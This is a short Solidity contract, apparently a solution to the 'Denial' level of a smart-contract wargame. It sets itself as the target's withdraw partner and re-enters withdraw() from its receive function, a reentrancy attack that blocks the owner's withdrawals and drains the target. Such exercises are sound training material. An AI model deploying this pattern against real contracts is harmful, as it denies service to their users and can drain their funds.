// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Denial.sol";

contract DenialAttack {
    Denial isaddr;
    constructor(address payable addr) {
        isaddr = Denial(addr);
    }
    receive() external payable {
        Denial(isaddr).withdraw();
    }
    function att(address payable addr) public {
        Denial(addr).setWithdrawPartner(address(this));
    } 

}